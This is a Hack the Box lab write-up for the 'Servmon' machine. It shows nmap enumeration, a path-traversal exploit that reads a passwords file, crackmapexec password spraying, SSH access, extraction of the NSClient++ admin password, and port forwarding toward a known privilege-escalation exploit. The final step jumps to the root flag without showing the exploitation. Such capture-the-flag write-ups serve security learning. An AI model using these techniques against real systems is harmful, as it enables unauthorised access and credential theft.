+++
title = "Hack the Box: Servmon"
date = 2023-02-05
description = "Hack the Box: Servmon"
tags = [
    "Hack the Box",
    "Write-up"
]
+++

# Servmon

## Enumeration

### Nmap

```
# sudo nmap -sV -sC -O -nvv 10.10.10.184 -Pn

PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnC92+BCplDo38VDQIZzb7V3HN/OucvxF0VMDDoYShdUrpDUW6JcSR/Zr6cADbHy7eDLw2O+WW+M4SzH7kfpbTv3HvJ0z8iOsRs2nUrUint4CR/A2vYA9SFOk18FU0QUS0sByBIlemU0uiPxN+iRCcpFhZDj+eiVRF7o/XxNbExnhU/2n9MXwFS8XTYNeGqSLE1vV6KdpMfpJj/yey8gvEpDQTX5OQK+kkUHze3LXLyu/XVTKzfqUBMAP+IQ5F6ICWgaC1a+cx/D7C/aobCbqaXY+75t1mxbEMmm1Wv/42nVQxcT7tN2C3sds4VJkYgZKcBhsE0XdJcR9mTb1wWsg9
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMToH2eB7rzpMZuvElpHYko/TXSsOfG8EXWQxmC/T4PCaAmVRDgJWEFMHgpRilSAKoOBlS2RHWNpMJldTFbWSVo=
|   256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILbqSRVLRJFVNhD0W0C5xB7b3RoJZZKdM+jSGryFWOQa
80/tcp   open  http          syn-ack ttl 127
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
5666/tcp open  tcpwrapped    syn-ack ttl 127
6699/tcp open  napster?      syn-ack ttl 127
8443/tcp open  ssl/https-alt syn-ack ttl 127
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|     :Saturday
|     workers
|_    jobs
| http-methods: 
|_  Supported Methods: GET
| http-title: NSClient++
```

Connect to tcp, cd /users/ find files there giving clues/tips.

[https://github.com/AleDiBen/NVMS1000-Exploit](https://github.com/AleDiBen/NVMS1000-Exploit "https://github.com/AleDiBen/NVMS1000-Exploit")
[https://docs.nsclient.org/](https://docs.nsclient.org/ "https://docs.nsclient.org/")

```
# python3 nvms.py 10.10.10.184 /users/Nathan/Desktop/Passwords.txt
[+] DT Attack Succeeded
[+] File Content

++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
++++++++++  END  ++++++++++
```

Put those password in a file dans pass it in crackmapexec:

```
# crackmapexec smb 10.10.10.184 -u Nadine -p pass-servmon.txt
...
SMB         10.10.10.184    445    SERVMON          [+] SERVMON\Nadine:L1k3B1gBut7s@W0rk
...
# crackmapexec smb 10.10.10.184 -u Nathan -p pass-servmon.txt
```

We can see we have Nadine has a read access to a share

```
# crackmapexec smb 10.10.10.184 -u Nadine -p L1k3B1gBut7s@W0rk --shares
SMB         10.10.10.184    445    SERVMON          [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:SERVMON) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [+] SERVMON\Nadine:L1k3B1gBut7s@W0rk 
SMB         10.10.10.184    445    SERVMON          [+] Enumerated shares
SMB         10.10.10.184    445    SERVMON          Share           Permissions     Remark
SMB         10.10.10.184    445    SERVMON          -----           -----------     ------
SMB         10.10.10.184    445    SERVMON          ADMIN$                          Remote Admin
SMB         10.10.10.184    445    SERVMON          C$                              Default share
SMB         10.10.10.184    445    SERVMON          IPC$            READ            Remote IPC
```

Let’s try to SSH with her credentials:

```
# ssh Nadine@10.10.10.184
# cd Desktop
# type user.txt
34c11d0537a6c54eaedaf0e70fa41a21
```

And we get the user hash.

```
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

NSClient++ is vulnerable to a PE: [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802 "https://www.exploit-db.com/exploits/46802").

`Type nsclient.ini` allow only localhost to access to the admin dashboard `allowed host = 127.0.0.1` let’s do a port forwarding to abuse that. Launch ssh service `ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184` and then open `https://127.0.0.1:8443`. C:\Users\Administrator\Desktop>type root.txt type root.txt 65b04c7b20598ff912c3dce1d317d579

[https://fdlucifer.github.io/2020-04-23-ServMon.html](https://fdlucifer.github.io/2020-04-23-ServMon.html "https://fdlucifer.github.io/2020-04-23-ServMon.html")
